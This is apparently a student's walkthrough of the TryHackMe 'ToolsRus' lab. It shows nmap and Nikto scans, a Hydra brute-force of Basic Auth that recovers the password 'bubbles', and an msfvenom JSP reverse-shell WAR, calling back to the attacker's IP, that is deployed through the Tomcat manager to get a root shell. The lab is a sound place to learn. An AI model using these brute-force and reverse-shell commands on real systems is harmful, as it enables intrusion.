################################
		Cosmin Tibuleac | 13.11.2021
################################


https://tryhackme.com/room/toolsrus

"Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine."


export IP=10.10.108.122

nmap -A -T4 -p- $IP -o nmap.txt


 # Task 1: ToysRus
 
 ## Question 1: What directory can you find, that begins with a "g"?
 
 We can use gobuster or dirbuster for this. 
 
 Looks like the answer for this question is `guidelines`
 ![[Pasted image 20211113100202.png]]
 
 Also, if we visit that directory on our web browser, we can see a message for "Bob":
 
 ![[Pasted image 20211113100250.png]]
 
 So, this tells us that the TomCat server might be potentially unupdated and vulnerable.
 
 ## Question 2: Whose name can you find from this directory?
 
 We just found him, it's `Bob`.
 
 ## Question 3:What directory has basic authentication?
 
 If we take a look at the above picture, we can see gobuster has had already found it: `protected`
 
 
 ## Question 4: What is bob's password to the protected part of the website?
 
 For this, we can use **Hydra**.
 
 The type of authentication the page /protected is using, is called "Basic Authentication", and it's a known weak authentication system.
 
 If we go to the page, we are presented with this: 
 
 ![[Pasted image 20211115152116.png]]
 
 First, we need to see what type of method the request is using, and where our credentials go.
 
 We can do this by opening the developer tab (on firefox use F12), and then looking at the Network Tab.
 
 We can see that our request is of type **GET** and that our credentials go to /protected.
 
 Now, it's time to fire up hydra and craft our command for it: 
 
 hydra -l bob -P /usr/share/wordlists/rockyou.txt IP_ADDRESS http-get /protected.
 
 We are using -l since we know the username "bob", -P to specify the location of our wordlist for password, in this case rockyou.txt,  the http request (GET) and the page where our credentials are being submitted (/protected).
 
 Additionally, you can add | tee hydra.log if you would like to get a log from hydra.
 
 In under 5 seconds, we can see that Hydra has managed to crack the password, which is "bubbles":
 ![[Pasted image 20211115152611.png]]
 
 Answer for this question: `bubbles`
 
 
 ## Question 5: What other port that serves a webs service is open on the machine?
 
 If we take a look at our nmap results, we can see that there's an apache server running on port `1234`.
 
 ## Question 6: Going to the service running on that port, what is the name and version of the software?

Answer format: Full_name_of_service/Version


We can also see this in our nmap scan: 

![[Pasted image 20211115153000.png]]


## Question 7: Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.

How many documentation files did Nikto identify?

For this, we can have Nikto "take a look" at the apache server: 


*nikto -h http://10.10.159.36:1234/manager/html*

![[Pasted image 20211115160336.png]]

If we take a look at what Nikto has found, we can see there are `5` documentation files.

## Question 8: What is the server version (run the scan against port 80)?

For this, we can either use nikto: nikto -h http://10.10.159.36:80

Or look in our previous nmap scan.

The server version is: `Apache/2.4.18`


## Question 9: What version of Apache-Coyote is this service using?

If we take a look at our previous nmap scan once more, we can see the Apache-Coyote version, which is `1.1`


## Question 10: Use Metasploit to exploit the service and get a shell on the system.

What user did you get a shell as?


If we go to the Apache server running on port 1234, we can go on the "Manager App" tab:

![[Pasted image 20211116003455.png]]

Remember, the credentials are "bob" for user, and "bubbles" for password.

If we scroll down, we can see we can upload files to the server: 

![[Pasted image 20211116003552.png]]

So, what we can do, is craft a **reverse shell** that calls back to our machine, and then access it. 

For this, we can use **msfvenom** to generate our shell:

*msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.50.6 LPORT=6666 -f war > shell.war*


Make sure to use your listening interface IP on LHOST.

Once you are done, upload the file to the server and then Deploy it.

![[Pasted image 20211116003757.png]]

Now, start a listener on the port you set for the reverse shell:

![[Pasted image 20211116003846.png]]

Once that is done, we need to access the file on the Apache server:

*http://10.10.186.137:1234/shell/*

Aaand we are in! As root! 

![[Pasted image 20211116004027.png]]

So, the answer for this question is `root`

## Question 11: What text is in the file /root/flag.txt

For this, just navigate to /root and **cat** the flag.txt.

